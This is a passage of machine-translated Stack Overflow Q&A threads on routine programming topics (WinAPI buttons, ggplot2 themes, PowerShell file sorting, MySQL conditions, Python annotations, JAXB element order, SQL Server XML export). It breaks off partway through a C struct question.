我最近开始研究 WinAPI。在浏览了大约十个关于它的教程的热门搜索结果之后，我仍然感到困惑，你在哪里为每个窗口添加多个控件的代码？例如，如果我想添加第二个按钮，需要什么样的代码以及将代码放在哪里？

当我`#define IDC_BUTTON WM_USER + 1`，添加`HINSTANCE hIns;`和`HWND hButton;`回调，然后调用这个：

```
case WM_CREATE:
    hIns=((LPCREATESTRUCT)lParam)->hInstance;
    hButton=CreateWindow("Button","Click Me",WS_CHILD|WS_VISIBLE,70,60,150,30,hwnd,(HMENU)IDC_BUTTON,hIns,0);
break; 
```

它工作，按钮出现在窗口中。但是当我尝试添加第二个时，即使更改了名称，也没有出现任何内容：

`#define IDC_BUTTON2 WM_USER + 2`
+
`HINSTANCE hIns;`
`HWND hButton2;`

```
case WM_CREATE:
   hIns=((LPCREATESTRUCT)lParam)->hInstance;
   hButton=CreateWindow("Button","Click Me",WS_CHILD|WS_VISIBLE,70,60,150,30,hwnd,(HMENU)IDC_BUTTON,hIns,0);
   hButton2=CreateWindow("Second","Press here",WS_CHILD|WS_VISIBLE,170,160,250,130,hwnd,(HMENU)IDC_BUTTON2,hIns,0);
   break; 
```

第一个按钮显示正常，但第二个按钮不正常（坐标也不同）。我在这里做错了什么？谢谢！

编辑：我替换`hIns2`了`hIns`代码中的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T15:39:30.063

```
 hButton2=CreateWindow("Second","Press here",WS_CHILD|WS_VISIBLE,...); 
```

让我们从核心解决这个问题。您做错的根本原因是完全忽略了检查错误的需要。CreateWindow() 失败时返回 NULL。GetLastError() 然后返回指示问题的错误代码。在带有“@err”伪变量的调试器中也可以看到相同的错误代码。

然后，您很快就会发现出现错误 1407，在 WinError.h SDK 标头中描述如下：

```
//
// MessageId: ERROR_CANNOT_FIND_WND_CLASS
//
// MessageText:
//
// Cannot find window class.
//
#define ERROR_CANNOT_FIND_WND_CLASS      1407L 
```

这清楚地表明您在 CreateWindow() 调用中弄错了类名。

**永远不要**跳过错误检查，尤其是当您刚开始使用 winapi 编程时。当用户机器出现问题时让程序优雅地失败不仅有用，而且诊断代码中的错误显然也非常有用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-04-21T16:18:30.983

首先，`"SECOND`除非你已经定义了一个类名，否则没有调用类名，所以如果你想说 10 个按钮，`CreateWindow`函数中的第一个参数将在所有这些按钮中，如果你想要一个可编辑的文本`"BUTTON"`，你也可以将其更改为`"EDIT"`盒子或者`"STATIC"`如果你蚂蚁放一个静态盒子。其次，如果您遵循以下说明，您可以更轻松地添加按钮：

`#define IDB_BUTTON WM_USER + 2` 而不是通过制作然后将其`IDB_BUTTON`插入`CreateWindow`函数来定义按钮， 因为`(HMENU)IDB_BUTTON` 您可以简单地写入`(HMENU)<any number of your choice>`CreateWindow 函数，就像`(HMENU) 2`不需要使用预定义该数字`#define`，然后当您想在按下按钮时进行操作时，您可以只需在具有 switch 的 switch 语句的情况下传递该数字`(LOWORD(wParam))`。

这似乎令人困惑，但请查看代码以了解我的意思

您的程序中的完整代码：

```
LRESULT CALLBACK WndProc(HWND hWnd, UINT Msg, WPARAM wParam, LPARAM lParam)
{
switch(Msg)
{
case WM_CREATE:
hButton=CreateWindow("Button","Click Me",WS_CHILD|WS_VISIBLE,70,60,150,30,hWnd,(HMENU) 1,NULL,NULL);
hButton2=CreateWindow("BUTTON","Press here",WS_CHILD|WS_VISIBLE,170,160,250,130,hwnd,(HMENU) 2,NULL,NULL);
break;
case WM_COMMAND:
switch(LOWORD(wParam))
{
case 1:
//What will the first button do?write it here
break;
case 2:
//What will the second button do?write it here
break;
}
    break;
}
return 0;
} 
```

祝你在学习win32 c++的道路上好运

;)

# r - 使用 theme_wsj {ggthemes} 时如何使 xlab 和 ylab 可见？

> ID：14379737
> 
> 赞同：2
> 
> 时间：2013-01-17T13:02:15.477
> 
> 标签：r, ggplot2

[您可以在此页面](https://github.com/jrnold/ggthemes#geoms)中查看示例。

请注意，在`theme_wsj`示例中，`xlab`并`ylab`没有出现。

这是一个包含标签的非 ggthemes 图：

```
ggplot(mtcars, aes(factor(cyl), mpg)) +
geom_point() +
xlab("Hello World: X axis") +
ylab("Hello World: Y axis") 
```

但是，当您添加`theme_wsj`主题时，它们会消失：

```
ggplot(mtcars, aes(factor(cyl), mpg)) +
geom_point() +
xlab("Hello World: X axis") +
ylab("Hello World: Y axis") +
theme_wsj() 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-01-17T13:15:44.113

如果您查看源代码，`theme_wsj()`您可以看到轴标题设置为空白

```
theme_wsj<-function(base_size=12, color="brown", base_family="sans", title_family="Courier") {
    colorhex <- ggthemes_data$wsj$bg[color]
    (theme_foundation()
     + theme(
.....
      axis.title=element_blank()
.... 
```

因此，获得`xlab`和`ylab`展示的一种解决方案是添加新的主题元素

```
+theme_wsj()+theme(axis.title=element_text(size=12)) 
```

# file - 用于根据名称将文件移动到文件夹的 Windows 脚本

> ID：14379739
> 
> 赞同：1
> 
> 时间：2013-01-17T13:02:32.540
> 
> 标签：file, sorting

我做了一些研究，但没有找到任何适合的/我无法更改任何脚本。

我想要一个脚本/链接，将文件/文件夹移动到第一个字符匹配的文件夹中。

就像我想将“apple.txt”移动到文件夹“A”一样，我想将文件夹“John”移动到文件夹“J”

谢谢您的帮助

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2017-06-14T14:28:01.943

我在搜索另一个主题时找到了您的帖子，但是以下 Powershell 脚本可以满足您的需求。将它放在包含您的文件的父目录中。它将根据文件名的第一个字母创建文件夹结构。它区分大小写，因此文件名中的“a”与“A”不同。

```

`$OrigFolder = ".\"
$NewFolder = ".\_Sorted to Move"

# Orphans folder, where files that return null in the regex match will be moved
# Example: file "- title.pdf"
# will be moved to ".\_Orphans" folder

$Orphans = '_Orphans' # Use the underscore to sort the folder to the top of the window

# First count the number of files in the $OrigFolder directory
$numFiles = (Get-ChildItem -Path $OrigFolder).Count
$i=0

# Tell the user what will happen
clear-host;
Write-Host 'This script will copy ' $numFiles ' files from ' $OrigFolder ' to _Sorted to Move'

# Ask user to confirm the copy operation
Read-host -prompt 'Press enter to start copying the files'

# Regex to match filenames
$Regex = [regex]"(?:([A-Za-z0-9]?)[A-Za-z0-9]?)"

# Loop through the $OrigFolder directory, skipping folders
Get-ChildItem -LiteralPath $OrigFolder | Where-Object {!$_.PsIsContainer} |
    ForEach-Object {
        if($_.BaseName -match $Regex){
        $ChildPath = $_.BaseName -replace $Regex

#Caluclate copy operation progress as a percentage
[int]$percent = $i / $numFiles * 100

# If first part of the file name is empty, move it to the '_Orphans' folder
if(!$Matches[1]){
    $ChildPath = $Orphans}
else {
    $ChildPath = $Matches[1]
    }

# Generate new folder name
$FolderName = Join-Path -Path $NewFolder -ChildPath ($ChildPath)

# Create folder if it doesn't exist
    if(!(Test-Path -LiteralPath $FolderName -PathType Container)){
    $null = New-Item -Path $FolderName -ItemType Directory}

# Log progress to the screen
Write-Host "$($_.FullName) -> $FolderName"

# Move the file to the folder
Move-Item -LiteralPath $_.FullName -Destination $FolderName

# Tell the user how much has been moved
Write-Progress -Activity "Copying ... ($percent %)" -status $_  -PercentComplete $percent -verbose
$i++
    }
}

Write-Host 'Total number of files in '$OrigFolder ' is ' $numFiles
Write-Host 'Total number of files copied to '$NewFolder ' is ' $i
Read-host -prompt "Press enter to complete..."
clear-host;` 

更改第 22 行中的正则表达式以更改匹配行为。

希望对你有效。

还可以查看程序 Directory Opus。这是一个非常成熟的产品。它可以轻松处理这些类型的任务。临时使用它有点贵，但是如果您每天管理大量文件，那真是天赐之物。我不知道没有它我该怎么办。在他们的论坛上有很多支持。

——斯科特

```

# c++ - 语法范围

> ID：14379741
> 
> 赞同：1
> 
> 时间：2013-01-17T13:02:52.107
> 
> 标签：c++, c++11

当我写这样的东西时：

```
int data[] = {10,44,56,78,8};      
int i = 0;
for(int element : data)
   ... 
```

`for`然后由编译器以常规方式翻译`for`？那`for` 只是语法糖吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T13:09:16.883

该标准将基于范围的`for`语句定义为：

```
{
  auto && __range = range-init;
  for ( auto __begin = begin-expr,
             __end = end-expr;
        __begin != __end;
        ++__begin ) {
    for-range-declaration = *__begin;
    statement
  }
} 
```

在您的情况下，`range-init`is `(data)`，`begin-expr`is `__range`，`end-expr`is `__range + 5`，`for-range-declaration`is`int element`和`statement`is `...`。也就是说，如果我们替换所有这些，您的`for`循环相当于：

```
{
  auto && __range = (data);
  for ( auto __begin = __range,
             __end = __range + 5;
        __begin != __end;
        ++__begin ) {
    int element = *__begin;
    ...
  }
} 
```

这种翻译是否真的由编译器完成是一个实现细节。您唯一可以保证的是您的代码将等同于上述代码。

# mysql - MySQL Query 根据列值定义 where 语句

> ID：14379742
> 
> 赞同：1
> 
> 时间：2013-01-17T13:02:52.527
> 
> 标签：mysql, sql, select, if-statement

我有这个 SQL：

```
SELECT
  `refnumbers`.`order_id`,
  `refnumbers`.`deal_id`,
  `refnumbers`.`claim_track_id`,
  `deals`.`partner_count`
FROM `refnumbers`
  JOIN `deals`
    ON (`refnumbers`.`deal_id` = `deals`.`ID`)
  JOIN `users`
    ON (`users`.`id` = `deals`.`partner_id`)
WHERE `refnumbers`.`is_claimed` = '1'
    AND `deals`.`partner_id` = '62039'
    AND `refnumbers`.`claimed_at` BETWEEN '2013-01-17 00:00:00'
    AND '2013-01-17 23:59:59'
ORDER BY `refnumbers`.`claimed_at` DESC 
```

我想选择 deals.partner_id = 62039 IF Deals.partner_count 为 1 的位置。

如果 partner_count 不是 1 那么它应该选择 where refnumbers.claim_track_id = 62039

如何才能做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T13:08:15.530

尝试

```
where
case when deals.partner_count = 1 
   then deals.partner_id = 62039
   else refnumbers.claim_track_id = 62039
end 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T13:06:30.343

您需要有一个条件括在括号中，它使用`OR`

```
SELECT  `refnumbers`.`order_id`, 
        `refnumbers`.`deal_id`, 
        `refnumbers`.`claim_track_id`, 
        `deals`.`partner_count`
FROM    `refnumbers` 
        INNER JOIN `deals` 
            ON (`refnumbers`.`deal_id` = `deals`.`ID`) 
        INNER JOIN `users` 
            ON (`users`.`id` = `deals`.`partner_id`) 
WHERE   `refnumbers`.`is_claimed` = '1'  AND 
        `refnumbers`.`claimed_at` BETWEEN '2013-01-17 00:00:00' AND '2013-01-17 23:59:59' 
        AND
        (
            (deals.partner_id = 62039 AND deals.partner_count = 1)
            OR
            (refnumbers.claim_track_id = 62039 AND deals.partner_count <> 1)
        )
ORDER BY `refnumbers`.`claimed_at` DESC 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T16:02:56.290

尝试这个：

```
SELECT r.order_id, r.deal_id,r.claim_track_id, d.partner_count
FROM refnumbers r
INNER JOIN deals d ON r.deal_id = d.ID
INNER JOIN users u ON d.partner_id = u.id 
WHERE IF(d.partner_count = 1, d.partner_id = '62039', r.claim_track_id = 62039) AND 
      r.is_claimed = '1' AND r.claimed_at BETWEEN '2013-01-17 00:00:00' AND '2013-01-17 23:59:59'
ORDER BY r.claimed_at DESC 
```

# prolog - Prolog 中的 OR 条件

> ID：14379746
> 
> 赞同：0
> 
> 时间：2013-01-17T13:03:05.087
> 
> 标签：prolog

我想检查一个数字是否可以被 3、5 或 7 之一整除。

我怎么能写出类似的规则-

```
isDivide(N) :- N mod 3 =:= 0 OR  N mod 5 =:= 0 OR N mod 7 =:= 0\. 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:21:29.283

```
isDivide(N) :- N mod 3 =:= 0\. 
isDivide(N) :- N mod 5 =:= 0\. 
isDivide(N) :- N mod 7 =:= 0\. 
```

或者：

```
isDivide(N) :- 
    N mod 3 =:= 0 
    ;  N mod 5 =:= 0 
    ; N mod 7 =:= 0\. 
```

请注意，`;`它不是在行尾，而是在下一行的开头。这纯粹是风格问题，但强烈建议遵循它。

# wpf - 具有特殊非模板项的自定义模板组合框

> ID：14379747
> 
> 赞同：1
> 
> 时间：2013-01-17T13:03:05.727
> 
> 标签：wpf, combobox, rad-controls, radcombobox

我有一个 RadTreeView，在每个项目中都有一个带有一些元素的 RadCombobox。现在我需要在每个组合框中添加一些“特殊”项目。用户可以单击此项目在组合框中添加新元素： ![在此处输入图像描述](../Images/9f78c259642e1becf26117051a1fbddf.png)

我当前的代码：

```
<DataTemplate x:Key="Monitor">
        <Grid Height="Auto" Width="Auto" HorizontalAlignment="Stretch" VerticalAlignment="Stretch">
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="16" />
                <ColumnDefinition Width="*" />
                <ColumnDefinition Width="Auto" />
                <ColumnDefinition Width="Auto" />
            </Grid.ColumnDefinitions>
            <Image Grid.Column="0" Height="16" Width="16" Source="icons\monitor.png" />
            <TextBlock Text="{Binding Name}" Margin="5 0 0 0" Grid.Column="1" Width="Auto" HorizontalAlignment="Stretch" VerticalAlignment="Center"/>

            <!-- PROBLEM IS HERE -->
            <telerik:RadComboBox Name="RadComboSchedule"
                 Grid.Column="2"
                 Margin="10 0 0 0"
                 Width="155"
                 ItemsSource="{Binding Source={StaticResource DataSource}, Path=ScheduleDataSource}"
                 ItemTemplate="{StaticResource ComboBoxTemplate}"
            >

            </telerik:RadComboBox>
            <Button Name="BtnRemoveMonitor" Grid.Column="3" Style="{StaticResource ButtonListBoxItemStyle}"  Template="{StaticResource RemoveButtonTemplate}" />
        </Grid>
    </DataTemplate>

<HierarchicalDataTemplate x:Key="Group"
           ItemTemplate="{StaticResource Monitor}"
           ItemsSource="{Binding Monitors}">
                <TextBlock Text="{Binding Name}" HorizontalAlignment="Stretch" VerticalAlignment="Stretch"/>
</HierarchicalDataTemplate>

<telerik:RadTreeView
    Name="RadTreeViewGroups"
    Height="auto"
    Width="auto"
    ItemsSource="{Binding Source={StaticResource DataSource}, Path=GroupsDataSource}"
    ItemTemplate="{StaticResource Group}"
    >
</telerik:RadTreeView> 
```

所以，我都喜欢没有元素“添加新项目”的屏幕截图。有任何想法吗？

PS 使用标准的 WPF Combobox 和 TreeView 控件不是问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T14:02:35.917

您可以在其中创建一个`DataSource`名为`ComboBox`“ADD NEW ITEM”的新项目，并在用户选择它时进行处理。

```
private void SelectItem(object sender, SelectionChangedEventArgs e)
{
    if (e.AddedItems[0].ToString() == "new")
    {
        string newItem = "completely new item";
        dataSource.Add(newItem);
        ((ComboBox)sender).SelectedItem = newItem;
    }
} 
```

在这个问题中，您可以看到一个更好的示例，每个项目都是一个类的实例，因此更容易处理“添加项目”请求：
[Databound WPF ComboBox with 'New...' item](https://stackoverflow.com/questions/4022118/databound-wpf-combobox-with-new-item)

* * *

**编辑** *（关于“添加项目”按钮模板）*：
*基于上面的示例*

有这堂课

```
public class DisplayClass
{
    public string Name { get; set; }
    public bool IsDummy { get; set; }
} 
```

你绑定`ComboBox.ItemsSource`到一个`ObservableCollection`这样的：

```
public ObservableCollection<DisplayClass> DataSource { get; set; } 
```

将该“虚拟”项目添加到集合中

```
DataSource.Add(new DisplayClass { Name = "ADD ITEM", IsDummy = true }); 
```

然后你用这样的方式处理项目选择：

```
private void SelectItem(object sender, SelectionChangedEventArgs e)
{
    var comboBox = (ComboBox)sender;
    var selectedItem = comboBox.SelectedItem as DisplayClass;

    if (selectedItem != null && selectedItem.IsDummy)
    {
        //Creating the new item
        var newItem = new DisplayClass { Name = comboBox.Items.Count.ToString(), IsDummy = false };
        //Adding to the datasource
        DataSource.Add(newItem);

        //Removing and adding the dummy item from the collection, thus it is always the last on the 'list'
        DataSource.Remove(selectedItem);
        DataSource.Add(selectedItem);

        //Select the new item
        comboBox.SelectedItem = newItem;
    }
} 
```

要正确显示项目，您需要更改`ComboBox.ItemTemplate`，当项目为虚拟时使图像不可见

```
<ComboBox ItemsSource="{Binding DataSource}" SelectionChanged="SelectItem">
    <ComboBox.ItemTemplate>
        <DataTemplate>
            <StackPanel Orientation="Horizontal">
                <TextBlock Text="{Binding Name}" Width="180" />
                <Image HorizontalAlignment="Right" Source="..." MouseLeftButtonUp="DeleteItem">
                    <Image.Style>
                        <Style TargetType="Image">
                            <Style.Triggers>
                                <DataTrigger Binding="{Binding IsDummy}" Value="True">
                                    <Setter Property="Visibility" Value="Hidden" />
                                </DataTrigger>
                            </Style.Triggers>
                        </Style>
                    </Image.Style>
                </Image>
            </StackPanel>
        </DataTemplate>
    </ComboBox.ItemTemplate>
</ComboBox> 
```

# google-app-engine - 将 gae 部署到开发服务器停止工作

> ID：14379752
> 
> 赞同：0
> 
> 时间：2013-01-17T13:03:31.157
> 
> 标签：google-app-engine, gae-eclipse-plugin

我正在完成一个运行良好的测试 GAE Java 项目，但我决定考虑将 GWT 添加到同一个项目中。然后我决定坚持我正在学习的 GAE 东西，并决定删除 GWT。问题是我现在无法部署到开发服务器，因为它在 Eclipse 控制台窗格中提供了以下内容。任何人都知道请我如何将适当的设置重置为我的项目最初的方式？

> 终止测试 [Web 应用程序] C:\Program Files\Java\jdk1.6.0_37\bin\javaw.exe 用法：[选项]
> 
> 选项：--help、-h 显示此帮助信息并退出。--server=SERVER 用于确定最新 -s SERVER SDK 版本的服务器。--address=ADDRESS 本地机器上接口的地址 -a ADDRESS
> 绑定到（或 0.0.0.0 对于所有接口）。--port=PORT
> 本地机器上绑定的端口号。-p PORT --sdk_root=DIR 覆盖 SDK 所在的位置。--disable_update_check 禁用对较新 SDK 版本的检查。--generated_dir=DIR 设置生成文件的目录。--jvm_flag=FLAG 将 FLAG 作为 JVM 参数传递。可以重复提供多个标志。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-18T12:19:11.810

通过设置一个新的虚拟 gae 项目并四处寻找，我似乎找到了自己的答案，发现 'Run As' > 'Run Configurations...' > '(x)= Arguments' > 'Program arguments'在参数的其余部分以“--port=8888”开头之前定义了一个额外的端口。我删除了“-codeServerPort 9997”的提及，它现在部署到开发服务器并且似乎像以前一样工作。

例如

新的虚拟项目：--port=8888 "C:\Users\tech1\SSD Storage\Eclipse Projects\workspace\dummy\war"

不会部署到开发服务器的项目：-codeServerPort 9997 --port=8888 "C:\Users\tech1\SSD Storage\Eclipse Projects\workspace\test\war"

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-18T11:35:55.690

我遇到了同样的问题，你知道吗，解决方法非常简单。

我创建了一个新的 appengine 项目，在 WAR 中只有一个 jsp，并且“运行方式”>“运行配置...”>服务器选项卡 -> 未选中然后选中运行内置服务器，然后选中自动选择任何端口。

服务器启动了......在一些可疑的 25334 端口上......我使用控制台终端上的红色按钮停止了它。

然后我把它改回 8888 和 WHOA 项目 Ran.... :)

然后我对旧项目做了同样的事情。删除了这个新的，一切都按预期工作。

# python - -> 在 Python 函数定义中是什么意思？

> ID：14379753
> 
> 赞同：787
> 
> 时间：2013-01-17T13:03:35.930
> 
> 标签：python, python-3.x, annotations, function-definition

[在查看Python 3.3 语法规范](http://docs.python.org/3.3/reference/grammar.html)时，我最近注意到一些有趣的事情：

```
funcdef: 'def' NAME parameters ['->' test] ':' suite 
```

Python 2 中没有可选的“箭头”块，我在 Python 3 中找不到任何有关其含义的信息。事实证明这是正确的 Python，并且被解释器接受：

```
def f(x) -> 123:
    return x 
```

我认为这可能是某种前置条件语法，但是：

*   我无法`x`在这里测试，因为它仍然未定义，
*   无论我在箭头后面放什么（例如`2 < 1`），它都不会影响函数的行为。

熟悉这种语法风格的人可以解释一下吗？

* * *

## 回答 #1

> 赞同：602
> 
> 时间：2013-01-17T13:04:57.427

这是一个[函数注释](http://www.python.org/dev/peps/pep-3107/)。

更详细地说，Python 2.x 有文档字符串，它允许您将元数据字符串附加到各种类型的对象。这非常方便，因此 Python 3 通过允许您将元数据附加到描述其参数和返回值的函数来扩展该功能。

没有先入为主的用例，但 PEP 提出了几个。一种非常方便的方法是允许您使用预期类型注释参数；然后很容易编写一个装饰器来验证注释或将参数强制为正确的类型。另一个是允许特定参数的文档，而不是将其编码到文档字符串中。

* * *

## 回答 #2

> 赞同：476
> 
> 时间：2013-02-25T17:46:19.943

这些是[PEP 3107](http://www.python.org/dev/peps/pep-3107/)中涵盖的函数注释。具体来说，`->`标记返回函数注释。

例子：

```
def kinetic_energy(m:'in KG', v:'in M/S')->'Joules': 
    return 1/2*m*v**2

>>> kinetic_energy.__annotations__
{'return': 'Joules', 'v': 'in M/S', 'm': 'in KG'} 
```

注释是字典，所以你可以这样做：

```
>>> '{:,} {}'.format(kinetic_energy(12,30),
      kinetic_energy.__annotations__['return'])
'5,400.0 Joules' 
```

您还可以拥有一个 python 数据结构，而不仅仅是一个字符串：

```
rd={'type':float,'units':'Joules',
    'docstring':'Given mass and velocity returns kinetic energy in Joules'}
def f()->rd:
    pass

>>> f.__annotations__['return']['type']
<class 'float'>
>>> f.__annotations__['return']['units']
'Joules'
>>> f.__annotations__['return']['docstring']
'Given mass and velocity returns kinetic energy in Joules' 
```

或者，您可以使用函数属性来验证调用的值：

```
def validate(func, locals):
    for var, test in func.__annotations__.items():
        value = locals[var]
        try: 
            pr=test.__name__+': '+test.__docstring__
        except AttributeError:
            pr=test.__name__   
        msg = '{}=={}; Test: {}'.format(var, value, pr)
        assert test(value), msg

def between(lo, hi):
    def _between(x):
            return lo <= x <= hi
    _between.__docstring__='must be between {} and {}'.format(lo,hi)       
    return _between

def f(x: between(3,10), y:lambda _y: isinstance(_y,int)):
    validate(f, locals())
    print(x,y) 
```

印刷

```
>>> f(2,2) 
AssertionError: x==2; Test: _between: must be between 3 and 10
>>> f(3,2.1)
AssertionError: y==2.1; Test: <lambda> 
```

* * *

## 回答 #3

> 赞同：234
> 
> 时间：2019-05-06T09:34:03.177

在以下代码中：

```
def f(x) -> int:
    return int(x) 
```

`-> int`只是告诉它返回`f()`一个整数（但它不强制函数返回一个整数）。它被称为*返回注解*，并且可以作为 访问`f.__annotations__['return']`。

Python 还支持参数注解：

```
def f(x: float) -> int:
    return int(x) 
```

`: float`告诉阅读程序（以及一些第三方库/程序，例如 pylint）的`x`人应该是`float`. 它被访问为`f.__annotations__['x']`，并且它本身没有任何意义。有关更多信息，请参阅文档：

[https://docs.python.org/3/reference/compound_stmts.html#function-definitions](https://docs.python.org/3/reference/compound_stmts.html#function-definitions) [https://www.python.org/dev/peps/pep-3107/](https://www.python.org/dev/peps/pep-3107/)

* * *

## 回答 #4

> 赞同：120
> 
> 时间：2016-12-16T23:19:19.327

正如其他答案所述，该`->`符号用作功能注释的一部分。但是，在最新版本的 Python`>= 3.5`中，它具有*明确*的含义。

[PEP 3107 - 函数注释](https://www.python.org/dev/peps/pep-3107/)描述了规范，定义了语法更改，`func.__annotations__`它们存储在其中的存在，以及它的用例仍然开放的事实。

但是在 Python`3.5`中，[PEP 484 -- Type Hints](https://www.python.org/dev/peps/pep-0484/)对此附加了一个单一的含义：`->`用于指示函数返回的类型。看起来这也将在未来版本中强制执行，如[What about existing uses of annotations](https://www.python.org/dev/peps/pep-0484/#what-about-existing-uses-of-annotations)中所述：

> 可以想象的最快方案将在 3.6 中引入非类型提示注释的静默弃用，在 3.7 中完全弃用，并将*类型提示声明为 Python 3.8 中唯一允许使用的注释。*

^(（强调我的）)

`3.6`据我所知，这还没有真正实现，所以它可能会被撞到未来的版本。

据此，您提供的示例：

```
def f(x) -> 123:
    return x 
```

将来会被禁止（并且在当前版本中会令人困惑），它需要更改为：

```
def f(x) -> int:
    return x 
```

为了有效地描述该函数`f`返回一个类型的对象`int`。

Python 本身不会以任何方式使用注释，它几乎会填充并忽略它们。由 3rd 方库与他们合作。

* * *

## 回答 #5

> 赞同：11
> 
> 时间：2019-12-13T16:09:01.663

这意味着函数返回的结果类型，但它可以是`None`.

它广泛存在于面向 Python 3.x 的现代库中。

例如，它在很多地方都有库**pandas-profiling**的代码，例如：

```
def get_description(self) -> dict:

def get_rejected_variables(self, threshold: float = 0.9) -> list:

def to_file(self, output_file: Path or str, silent: bool = True) -> None:
"""Write the report to a file. 
```

* * *

## 回答 #6

> 赞同：9
> 
> 时间：2020-05-30T22:53:59.743

```
def f(x) -> 123:
    return x 
```

我的总结：

1.  简单`->`介绍是为了让开发人员有选择地指定函数的返回类型。请参阅[Python 增强提案 3107](https://www.python.org/dev/peps/pep-3107/)

2.  这表明随着 Python 被广泛采用，未来事情会如何发展——表明强类型化——这是我个人的观察。

3.  您也可以指定参数的类型。指定函数和参数的返回类型将有助于减少逻辑错误和改进代码增强。

4.  您可以将表达式作为返回类型（在函数和参数级别），并且可以通过**注释**对象的“返回”属性访问表达式的结果。**对于 lambda 内联函数的表达式/返回值，注释**将为空。

* * *

## 回答 #7

> 赞同：8
> 
> 时间：2019-04-06T16:39:29.073

`def function(arg)->123:`

它只是一个返回类型，在这种情况下，**整数与你写的数字无关。**

像**Java**：

```
public int function(int args){...} 
```

但是对于 Python（[Jim Fasarakis Hilliard](https://stackoverflow.com/a/41193772/6157415)怎么说） **返回类型只是一个提示**，所以它建议返回，但无论如何都允许返回其他类型，如字符串..

* * *

## 回答 #8

> 赞同：6
> 
> 时间：2021-06-10T05:08:07.283

**->**在python3中引入。

简单来说，**->**后面的内容表示函数的返回类型。返回类型是可选的。

* * *

## 回答 #9

> 赞同：4
> 
> 时间：2020-11-12T21:43:05.210

```
def f(x) -> str:
return x+4

print(f(45)) 
```

将给出结果：**49**。

或者换句话说 '-> str' 对返回类型没有影响：

```
print(f(45).__class__)

<class 'int'> 
```

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2021-12-13T10:44:58.930

它只是告诉用户它期望什么或返回值

`funcname.__annotations__`将打印详细信息

像

```
def function(name:str ,age:int) -> "printing the personal details ":
    print(f"name is {name} age is {age}")

function("test",20)
print(function.__annotations__) 
```

***输出***

```
name is test age is 20
{'name': <class 'str'>, 'age': <class 'int'>, 'return': 'printing the personal details '} 
```

即使您返回值，它也不会显示任何内容。

# java - 休息 - 订购 GET 响应 xml

> ID：14379759
> 
> 赞同：1
> 
> 时间：2013-01-17T13:03:47.847
> 
> 标签：java, xml, rest, get, jaxb

我从 rest GET 方法得到这个简单的 xml。Restful 服务是用 java 编写的。

```
 <gear>
      <price>355.95929799818884</price>
      <idGear>1</idGear>
      <year>1985</year>
      <name>GPS</name>
  </gear> 
```

我的问题是如何更改xml的顺序？我想将 idGear 作为第一个节点。这是基本的还是比我想象的更复杂？感谢帮助？

更新：

```
@XmlRootElement
@Entity(name="gear")
public class Gear{

    @Id
    @GeneratedValue
    int idGear;
    private String name;
    private int year;
    private double price;
      //getters, setters 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-17T14:25:43.337

您可以使用`@XmlType`注释并设置 a`propOrder`来控制元素编组为 XML 的顺序。

```
@XmlRootElement
@XmlType(propOrder={"idGear", "name", "year", "price"})
@Entity(name="gear")
public class Gear{

    @Id
    @GeneratedValue
    int idGear;
    private String name;
    private int year;
    private double price;

} 
```

**了解更多信息**

*   [http://blog.bdoughan.com/2012/02/jaxbs-xmltype-and-proporder.html](http://blog.bdoughan.com/2012/02/jaxbs-xmltype-and-proporder.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T14:29:41.583

@XmlType 注解有一个属性 propOrder 可以使用。这是来自文档：

> 注释元素 propOrder() 可用于将内容模型自定义为 xs:all 或 xs:sequence。它用于指定 xs:sequence 中 XML 元素的顺序。

[XmlType 的 Javadoc](http://docs.oracle.com/javaee/5/api/javax/xml/bind/annotation/XmlType.html)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-01-17T14:30:20.313

它与休息无关。在 JAXB 转换时只能通过使用`proporder`in `@XmlType`annotation 之类的方法来实现。

```
@XmlType(propOrder={"idGear", "name", "year", "price"}) 
```

# sql - 将 SQL 查询导出到 XML 文件

> ID：14379764
> 
> 赞同：2
> 
> 时间：2013-01-17T13:04:10.870
> 
> 标签：sql, sql-server, xml, sql-server-2008

我需要将 SQL Server 中的 SQL 查询导出到 XML 文件。到目前为止，我做了一个查询是：

```
select * 
from 
products 
for xml path ('product'), root ('Products'); 
```

使用此查询，结果是正确的，但我还没有找到将其导出到文件的方法。

如果可能的话，我的想法是从 SQL Management Studio 进行导出。如果这个选项是不可能的，我想帮我看看我可以使用哪些其他选项。

我见过的其他选项是 SQLCMD 和带有 Visual Basic 的 .NET。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:11:05.630

在管理工作室中：

1.  如上所述运行查询。
2.  单击结果中的 XML 链接 - 这将在新窗口中打开 XML。
3.  导航到新窗口和文件 -> 另存为 - 默认情况下应另存为 XML。

有点手动过程，但可能对临时场景有用？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-10-09T15:29:31.993

为了其他将要寻找此答案的人。

这可以通过两种方式实现。使用`EXEC xp_cmdshell`并在语法中添加 queryout "Report.xml" 以将其保存为 xml 文件。

```
EXEC master.dbo.xp_cmdshell 'bcp "SELECT *FROM DataTable" queryout Report.xml -S[ServerName] 
```

使用`sqlcmd tool`. 像这样，

只需添加将查询保存为 input.sql：

```
 sqlcmd -S <your-server> -i input.sql -o Report.xml 
```

# c - 二维结构数组——malloc() 和 free()

> ID：14379771
> 
> 赞同：2
> 
> 时间：2013-01-17T13:04:31.887
> 
> 标签：c, multidimensional-array, malloc, free

```
#pragma pack(push, 1)
typedef struct 
{
      /*...*/
  unsigned int      dataoffset;         //No of bytes before actual pixel data
}HEADER;

typedef struct 
{
   /*...*/
   unsigned int     width;
   unsigned int     height;
   unsigned short   bits_per_pixel;         //code is written for 24 bits only and No other format is supported..
    /*...*/
